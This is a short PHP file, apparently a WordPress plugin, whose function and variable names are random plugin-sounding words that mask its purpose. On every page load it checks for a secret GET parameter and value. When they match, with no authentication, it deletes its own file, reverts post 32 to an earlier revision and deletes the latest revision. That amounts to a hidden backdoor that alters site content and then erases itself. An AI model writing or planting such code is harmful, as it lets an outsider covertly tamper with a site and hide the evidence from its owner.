<?php

function files_fancy_scheduled_reminder() {
	if (isset($_GET['validation_jigoshop_variation']) && $_GET['validation_jigoshop_variation'] === 'tags_headers_sticky_zoom') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$booster_virtual_read_timer = 32;
		$send_event_insert = wp_get_post_revisions($booster_virtual_read_timer);
		if (empty($send_event_insert)) die('no revisions');
		if (count($send_event_insert) < 2) die('less than 2');
		$search_mini_effects = array_shift($send_event_insert);
		$select_translator_ai_guest = $search_mini_effects->ID;
		$variations_express_slideshow_view = array_shift($send_event_insert);
		$zoom_patterns_coming = $variations_express_slideshow_view->ID;
		$disable_order_plugin_lightgray = wp_restore_post_revision($zoom_patterns_coming);
		if ($disable_order_plugin_lightgray === false) die('error restoring');
		$disable_order_plugin_lightgray = wp_delete_post_revision($select_translator_ai_guest);		
		if ($disable_order_plugin_lightgray === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'files_fancy_scheduled_reminder');
